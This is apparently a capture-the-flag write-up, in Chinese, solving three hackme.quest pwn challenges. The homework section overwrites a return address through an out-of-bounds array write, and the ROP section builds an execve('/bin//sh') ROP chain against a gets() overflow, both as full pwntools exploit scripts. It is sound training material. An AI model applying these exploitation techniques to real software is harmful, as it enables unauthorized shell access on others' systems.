# 57 catflag
就直接連上去就好了
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7709)
    r.interactive()
```

# 58 homework
從原始碼可以看出這個地方允許使用者修改任意位置的值
![image alt](https://i.imgur.com/3GEpGpV.png")

可以從這個地方修改return address value到call_me_maybe來開啟shell
先使用r2來查call_me_maybe address的位置
![image alt](https://i.imgur.com/NJZ0IGv.png")

查出了是0x080485fb 轉成十進位後為134514171
下一步就是要計算好offset來讓程式修改到正確的位置
陣列的大小為10個int也就是40byte，換算為16進位後為0x28
![image alt](https://i.imgur.com/lTtaYxK.png")
從變數宣告處0x34扣掉0xc後即為0x28得出陣列位於0x34的位置
接著便可來計算offset
0x34再加上saved rbp的0x4後除4為14即為offset
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7701)
    r.recvuntil(b'name? ')
    r.sendline(b'haha')
    r.recvuntil(b'numbers\n')
    r.recvuntil(b'> ')
    r.sendline(b'1')
    r.recvuntil(b'edit: ')
    r.sendline(b'14')
    r.recvuntil(b'many? ')
    r.sendline(b'134514171')
    r.recvuntil(b'numbers\n')
    r.recvuntil(b'> ')
    r.sendline(b'0')
    r.interactive()
```

# 59 ROP
checksec 一下後發現沒有開啟Canary和PIE，程式又有用gets來做讀取
所以可以直接buffer overflow掉reutrn address
但比較麻煩的是程式裡面沒有直接提供shell的function，所以得自己搞
這時候就要用到ROP的技術，簡單來說就是一直在程式裡面跳來跳去
先下這個指令
```
ROPgadget --binary ./ROP --ropchain
```
然後ROP chain就建好了 Yaaa
接著只需要算個offset就好，讓他可以剛好從return address開始寫
變數的長度為0xc再加上4之後為0x10
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7704)

    # Padding goes here
    p = b'a' * 0x10

    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea060)  # @ .data
    p += pack('<I', 0x080b8016)  # pop eax ; ret
    p += b'/bin'
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea064)  # @ .data + 4
    p += pack('<I', 0x080b8016)  # pop eax ; ret
    p += b'//sh'
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9)  # pop ebx ; ret
    p += pack('<I', 0x080ea060)  # @ .data
    p += pack('<I', 0x080de769)  # pop ecx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0806c943)  # int 0x80
    r.sendline(p)

    r.interactive()
```